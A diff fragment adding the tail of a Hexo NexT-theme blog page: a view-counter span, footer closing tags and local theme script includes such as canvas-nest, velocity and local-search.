+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
+<script src="/js/schemes/pisces.js?v=7.4.2"></script>
+<script src="/js/next-boot.js?v=7.4.2"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.2"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
